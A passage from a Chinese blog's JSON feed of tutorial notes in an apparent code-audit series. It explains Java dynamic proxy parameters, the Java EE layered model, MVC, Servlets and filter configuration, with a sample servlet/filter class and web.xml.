有3个参数：<code>proxy</code>、<code>method</code>、<code>args</code>，各个参数含义如下。</p>\n<p><code>proxy</code>：在其上调用方法的代理实例。</p>\n<p><code>method</code>：对应于在代理实例上调用的接口方法的Method 实例。 Method 对象的声明类将是在其中声明方法的接口，该接口可以是代理类赖以继承方法的代理接口的超接口。</p>\n<p><code>args</code>：包含传入代理实例上方法调用的参数值的对象数组，如果接口方法不使用参数，则为null。基本类型的参数被包装在适当基本包装器类（如<code>Java.lang.Integer</code>或<code>Java.lang.Boolean</code>）的实例中。</p>\n<p><strong>这里没咋看懂，后面再说吧。</strong></p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "1-Java EE分层模型",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/1-JavaEE.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/1-JavaEE.html",
      "summary": "1-Java EE分层模型\n\nJava EE可以说是一个框架，也可以说是一种规范。\nJava平台有3个主要版本，分别是 Java SE（Java Platform Standard Edition，Java平台标准版）、Java EE（Java Platform Enterprise Edition，Java平台企业版）和Java ME（Java Pl...",
      "content_html": "\n<blockquote>\n<p>Java EE可以说是一个框架，也可以说是一种规范。</p>\n<p>Java平台有3个主要版本，分别是 Java SE（Java Platform Standard Edition，Java平台标准版）、Java EE（Java Platform Enterprise Edition，Java平台企业版）和Java ME（Java Platform Micro Edition，Java平台微型版）。</p>\n<p>Java EE是Sun公司为企业级应用推出的标准平台，用来开发B/S架构软件，是Java应用最广泛的版本。Java EE也称为Java 2 Platform或Enterprise Edition（J2EE），2018年3月更名为Jakarta EE。</p>\n</blockquote>\n<p>Web开发诞生之初都是静态的HTML页面，后来随着需求大量增长和技术快速发展，逐渐出现了数据库和动态页面，但是没有分层概念。当时的开发者在开发项目时，会把所有的代码都写在页面上，包括数据库连接代码、事务控制代码以及各种校验和逻辑控制代码等。如果项目规模巨大，一个文件可能有上万行代码。如果开发人员需要修改业务功能或者定位Bug，会有非常大的麻烦，可维护性差。随着时间的推移，Java EE 分层模型应运而生。</p>\n<h2>1、Java EE的核心技术</h2>\n<blockquote>\n<p>此处只记录部分</p>\n</blockquote>\n<p>JDBC（Java Database Connectivity，Java数据库连接）：在 Java 语言中用来规范客户端程序如何访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。</p>\n<p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）： Java 的一个目录服务应用程序界面（API），它提供了一个目录系统，并将服务名称与对象关联起来，从而使开发人员在开发过程中可以用名称来访问对象。</p>\n<p>企业级JavaBean（Enterprise JavaBean，EJB）：一个用来构筑企业级应用的、在服务器端可被管理的组件。</p>\n<p>RMI（Remote Method Invocation，远程方法调用）：Java的一组拥护开发分布式应用程序的API，它大大增强了Java开发分布式应用的能力。</p>\n<p>Servlet（Server Applet）：使用Java编写的服务器端程序。狭义的Servlet是指 Java 语言实现的一个接口，广义的Servlet是指任何实现该Servlet接口的类。其主要功能在于交互式地浏览和修改数据，生成动态Web 内容。</p>\n<p>JSP（JavaServer Pages）：由Sun公司主导并创建的一种动态网页技术标准。JSP 部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态生成 HTML、XML 或其他格式文档的 Web 网页，然后返回给请求者。</p>\n<p>XML（eXtensible Markup Language，可扩展标记语言）：是被设计用于传输和存储数据的语言。</p>\n<p>Java消息服务（Java Message Service，JMS）是一个Java平台中关于面向消息中间件（MOM）的API，用于在两个应用程序之间或分布式系统中发送消息，进行异步通信。</p>\n<h2>2、Java EE分层模型</h2>\n<p>Java EE 应用的分层模型主要分为以下5层。</p>\n<ol>\n<li><strong>Domain Object</strong>（领域对象）层：本层由一系列POJO（Plain Old Java Object，普通的、传统的Java对象）组成，这些对象是该系统的Domain Object，通常包含各自所需实现的业务逻辑方法。</li>\n<li><strong>DAO</strong>（Data Access Object，数据访问对象）层：本层由一系列 DAO 组件组成，这些DAO实现了对数据库的创建、查询、更新和删除等操作。</li>\n<li><strong>Service</strong>（业务逻辑）层：本层由一系列的业务逻辑对象组成，这些业务逻辑对象实现了系统所需要的业务逻辑方法。</li>\n<li><strong>Controller</strong>（控制器）层：本层由一系列控制器组成，这些控制器用于拦截用户的请求，并调用业务逻辑组件的业务逻辑方法去处理用户请求，然后根据处理结果向不同的View组件转发。</li>\n<li><strong>View</strong>（表现）层：本层由一系列的页面及视图组件组成，负责收集用户请求，并显示处理后的结果。</li>\n</ol>\n<p>如图，首先由数据库给Domain Object层提供持久化服务，然后由 Domain Object层去封装DAO层，DAO层为业务逻辑层提供数据访问服务，接着业务逻辑层为控制器层提供逻辑支持，最终在表现层显示结果。</p>\n<figure><figcaption>img</figcaption></figure>\n<p>分层模型Java EE分层模型的应用，使得项目易于维护，管理简化，并且适应大规模和复杂的应用需求以及不断变化的业务需求。此外，分层模型还能有效提高系统并发处理能力。</p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "2-JavaMVC",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/2-JavaMVC.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/2-JavaMVC.html",
      "summary": "2-JavaMVC\n\nJava MVC的框架有很多，如比较经典的Struts1框架、Struts2 框架、Spring MVC框架，此外还有小众的JSF框架以及Tapestry 框架。\n\n1、MVC的概念\nMVC 全名是 Model View Controller，M（Model）是指数据模型，V（View）是指用户界面，C（Controller）是控...",
      "content_html": "\n<blockquote>\n<p><strong>Java MVC的框架</strong>有很多，如比较经典的Struts1框架、Struts2 框架、Spring MVC框架，此外还有小众的JSF框架以及Tapestry 框架。</p>\n</blockquote>\n<h2>1、MVC的概念</h2>\n<p>MVC 全名是 Model View Controller，M（Model）是指数据模型，V（View）是指用户界面，C（Controller）是控制器。使用 MVC 最直接的目的就是将M和V实现代码分离，C 则是确保 M 和 V 的同步，一旦 M 改变，V就应该同步更新。简单来说，MVC是一个设计模式，它强制性地使应用程序的输入、处理和输出分开。</p>\n<p>MVC应用程序被分成3个核心部件：<strong>Model</strong>、<strong>View</strong>、<strong>Controller</strong>。它们独立处理各自的任务。具体如下：</p>\n<ol>\n<li>模型（Model）：表示携带数据的对象或Java POJO。即使模型内的数据改变，它也具有逻辑来更新控制器。</li>\n<li>控制器（Controller）：表示逻辑控制，控制器对模型和视图都有作用，控制数据流进入模型对象，并在数据更改时更新视图，是视图和模型的中间层。</li>\n<li>视图（View）：表示模型包含的数据的可视化层。</li>\n</ol>\n<h2>2、MVC工作流程</h2>\n<p>首先，Controller层接收用户的请求，并决定应该调用哪个Model来进行处理；</p>\n<p>然后，由Model使用逻辑处理用户的请求并返回数据；</p>\n<p>最后，返回的数据通过View层呈现给用户。具体流程如图所示。</p>\n<figure><figcaption>img</figcaption></figure>\n<p>MVC模式使视图层和业务层分离，以便更改View层代码时，不用重新编译Model和Controller代码。同样，当某个应用的业务流程或者业务规则发生改变时，只需要改动Model层即可实现需求。</p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "3-Servlet",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/3-JavaWeb_Servlet.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/3-JavaWeb_Servlet.html",
      "summary": "3-Servlet\nServlet其实是在 Java Web容器中运行的小程序。用户通常使用 Servlet 来处理一些较为复杂的服务器端的业务逻辑。\nServlet原则上可以通过任何客户端-服务器协议进行通信，但是它们常与HTTP一起使用，因此，“Servlet”通常用作“HTTP servlet”的简写。\nServlet 是 Java EE的核心，...",
      "content_html": "\n<p>Servlet其实是在 Java Web容器中运行的小程序。用户通常使用 Servlet 来处理一些较为复杂的服务器端的业务逻辑。</p>\n<p>Servlet原则上可以通过任何客户端-服务器协议进行通信，但是它们常与HTTP一起使用，因此，“Servlet”通常用作“HTTP servlet”的简写。</p>\n<p>Servlet 是 Java EE的核心，也是所有MVC框架实现的根本。</p>\n<h2>1、Servlet的配置</h2>\n<p>HTTPServlet使用一个 HTML 表单来发送和接收数据。要创建一个 HTTPServlet，需要继承<code>javax.servlet.http.HttpServlet</code>类并重写<code>doXXX</code>(如<code>doGet、doPost</code>)方法或者<code>service</code>方法，该类是用专门的方法来处理 HTML表单的 GenericServlet 的一个子类。</p>\n<p>Servlet 3.0之前的版本都是在web.xml中配置的，而Servlet 3.0之后的版本则使用更为便捷的注解方式来配置。</p>\n<p>不同版本的Servlet所需的Java/JDK版本也不相同。</p>\n<p>| Servlet版本 | Java版本         | Tomcat版本   |\n|</p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "4-filter",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/4-JavaWeb_filter.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/4-JavaWeb_filter.html",
      "summary": "4-filter\nfilter被称为过滤器，是 Servlet 2.3新增的一个特性，同时它也是Servlet 技术中最实用的技术。开发人员通过filter技术，能够实现对所有Web资源的管理，如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。\n1、filter的配置\nfilter的配置类似于Servlet，由<filter>和<filte...",
      "content_html": "\n<p>filter被称为过滤器，是 Servlet 2.3新增的一个特性，同时它也是Servlet 技术中最实用的技术。开发人员通过filter技术，能够实现对所有Web资源的管理，如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p>\n<h2>1、filter的配置</h2>\n<p>filter的配置类似于Servlet，由<code>&lt;filter&gt;</code>和<code>&lt;filter-mapping&gt;</code>两组标签组成，可以使用web.xml进行配置，同样，如果Servlet版本大于3.0，也可以使用注解的方式来配置filter。</p>\n<h3>1.1 基于web.xml的配置</h3>\n<p>filter 同样有很多标签，其中各个标签的含义如下。</p>\n<p><code>&lt;filter&gt;</code>：指定一个过滤器。</p>\n<p><code>&lt;filter-name&gt;</code>：用于为过滤器指定一个名称，该元素的内容不能为空。</p>\n<p><code>&lt;filter-class&gt;</code>：用于指定过滤器的完整的限定类名。</p>\n<p><code>&lt;init-param&gt;</code>：用于为过滤器指定初始化参数。</p>\n<p><code>&lt;param-name&gt;</code>：为<code>&lt;init-param&gt;</code>的子参数，用于指定参数的名称。</p>\n<p><code>&lt;param-value&gt;</code>：为<code>&lt;init-param&gt;</code>的子参数，用于指定参数的值。</p>\n<p><code>&lt;filter-mapping&gt;</code>：用于设置一个filter所负责拦截的资源。</p>\n<p><code>&lt;filter-name&gt;</code>：为<code>&lt;filter-mapping&gt;</code>子元素，用于设置filter的注册名称。该值必须是在<code>&lt;filter&gt;</code>元素中声明过的过滤器的名称。</p>\n<p><code>&lt;url-pattern&gt;</code>：用于设置 filter 所拦截的请求路径（过滤器关联的URL样式）。</p>\n<p><code>&lt;servlet-name&gt;</code>：用于指定过滤器所拦截的Servlet名称。</p>\n<p>如下先写一个类，实现Filter接口，配置好他的servlet信息(下面的代码均延续了上一节Servlet部分)：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sec<span class=\"token punctuation\">.</span>filter</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/9/17 21:19\n * @Description :\n */</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">PrintWriter</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SimpleDateFormat</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Date</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Enumeration</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Filter</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token annotation punctuation\">@WebServlet</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"NewServlet1\"</span><span class=\"token punctuation\">,</span> value <span class=\"token operator\">=</span> <span class=\"token string\">\"/NewServlet1\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">NewServlet1</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Filter</span><span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> req<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> resp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请求方式\"</span> <span class=\"token operator\">+</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"访问路径\"</span> <span class=\"token operator\">+</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getServletPath</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"协议类型\"</span> <span class=\"token operator\">+</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getProtocol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//读取消息头，getHeaderNames()返回key的迭代器, 该迭代器是比Iterator更古老的迭代器.</span>\n        <span class=\"token class-name\">Enumeration</span> e <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getHeaderNames</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span><span class=\"token function\">hasMoreElements</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">String</span> key <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> e<span class=\"token punctuation\">.</span><span class=\"token function\">nextElement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span> value <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getHeader</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>key <span class=\"token operator\">+</span> <span class=\"token string\">\":\"</span> <span class=\"token operator\">+</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">//写消息头告诉浏览器给它输出的是什么格式的内容</span>\n        resp<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"text/html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//获取输出流，该流指向的目标就是浏览器</span>\n        <span class=\"token class-name\">PrintWriter</span> out <span class=\"token operator\">=</span> resp<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//省略代码N行</span>\n        <span class=\"token class-name\">Date</span> date <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">SimpleDateFormat</span> sdf <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SimpleDateFormat</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"HH:mm:ss\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> now <span class=\"token operator\">=</span> sdf<span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>date<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//写实体内容</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;!DOCTYPE HTML&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;html&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;head&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;title&gt;TimeServlet&lt;/title&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;meta charset='utf-8'&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;/head&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;body&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;p&gt;\"</span><span class=\"token operator\">+</span>now<span class=\"token operator\">+</span><span class=\"token string\">\"&lt;/p&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;/body&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;/html&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> req<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> resp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FilterConfig</span> filterConfig<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doFilter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequest</span> servletRequest<span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletResponse</span> servletResponse<span class=\"token punctuation\">,</span> <span class=\"token class-name\">FilterChain</span> filterChain<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>然后修改web.xml</p>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>web-app</span> <span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://xmlns.jcp.org/xml/ns/javaee<span class=\"token punctuation\">\"</span></span>\n         <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xsi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XMLSchema-instance<span class=\"token punctuation\">\"</span></span>\n         <span class=\"token attr-name\"><span class=\"token namespace\">xsi:</span>schemaLocation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class=\"token punctuation\">\"</span></span>\n         <span class=\"token attr-name\">version</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>4.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">&gt;</span></span>user<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-class</span><span class=\"token punctuation\">&gt;</span></span>com.sec.filter.UserServlet<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-class</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet</span><span class=\"token punctuation\">&gt;</span></span>\n\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-mapping</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">&gt;</span></span>user<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url-pattern</span><span class=\"token punctuation\">&gt;</span></span>/user<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url-pattern</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-mapping</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>filter</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>filter-name</span><span class=\"token punctuation\">&gt;</span></span>NewServlet1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>filter-name</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>filter-class</span><span class=\"token punctuation\">&gt;</span></span>com.sec.filter.NewServlet1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>filter-class</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>filter</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>filter-mapping</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>filter-name</span><span class=\"token punctuation\">&gt;</span></span>NewServlet1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>filter-name</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url-pattern</span><span class=\"token punctuation\">&gt;</span></span>/NewServlet1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url-pattern</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>filter-mapping</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>web-app</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>访问对应url，即可运行<code>doFilter()</code>方法中的内容</p>\n<figure><figcaption>image-20230924224921620</figcaption></figure>\n<h3>1.2 基于注解方式的配置</h3>\n<blockquote>\n<p>实例代码见后面filter接口部分</p>\n</blockquote>\n<p>因为Servlet 的关系，在Servlet 3.0以后，开发者同样可以不用在web.xml里面配置filter，只需要添加@WebServlet注解就可以修改filter的属性，web.xml可以配置的filter属性都可以通过 @WebServlet的方式进行配置。</p>\n<p><strong>@WebFilter常用属性</strong></p>\n<p>| 属性              | 类型             | 是否必需 | 说明                                                         |\n|</p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "5-Listener",
